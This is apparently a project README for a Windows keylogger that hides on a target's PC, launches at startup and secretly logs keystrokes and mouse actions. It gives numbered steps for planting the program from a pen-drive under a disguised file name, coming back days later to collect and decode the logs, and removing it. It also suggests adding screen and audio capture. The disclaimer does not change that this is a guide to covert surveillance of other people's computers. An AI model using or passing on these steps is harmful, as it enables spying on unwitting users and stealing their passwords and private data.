  "body": "This tacky program hides itself in the subjectâ€™s PC, and silently records all keyboard and mouse operations.  It is launched automatically with PC start, then stores data in ASCII code with record-date. Now all you have to do is- collect the record, and decode it.\r\n\r\nThis was actually a pre-project for [TrojanCockroach](https://github.com/MinhasKamal/TrojanCockroach). It is simple and straight-forward.\r\n\r\n\r\n### How to use?\r\n\r\n1. Download the full package from [here](https://github.com/MinhasKamal/KeyLogger/archive/application.zip), unzip it, and move it to your pen-drive.\r\n\r\n2. **---** is the compiled and renamed form of **KeyLogger.cpp** (of course you do not expect others to let you insert a pen-drive containing keylogger!). **---** is a link file of **---**. Now insert your pen-drive in a computer, and run **---**. This will install **---** and **---** in that PC (Windows Vista or later).\r\n\r\n3. Wait for some days, then return to the PC, and run **---**. You will get a file named **---**.\r\n\r\n4. Now, simply run **---** (do not rename **---**). You will get another file- **---**. Here you will get that you want.\r\n\r\n5. If you want to remove the Keylogger from that PC, run **---**.\r\n\r\n\r\nSurely you can use it in many other ways, and also enhance its ability by adding a screen capturer or sound recorder. But guess what! you have to get your hands dirty. ðŸ˜ˆ\r\n\r\n**Note:** I do not want newbies to abuse my project, so I am not revealing all the secrets. I will not also take any responsibility of someone else's ill act with my program. But I do believe that a real learner will learn a lot from this. \r\n\r\n### License\r\n<a rel=\"license\" href=\"http://www.gnu.org/licenses/gpl.html\">\r\n<img alt=\"GNU General Public License\" style=\"border-width:0\" src=\"http://www.gnu.org/graphics/gplv3-127x51.png\" />\r\n</a>\r\n<br/><a href=\"https://github.com/MinhasKamal/KeyLogger\">KeyLogger</a> is licensed under a <a rel=\"license\" href=\"http://www.gnu.org/licenses/gpl.html\">GNU General Public License version-3</a>.\r\n",
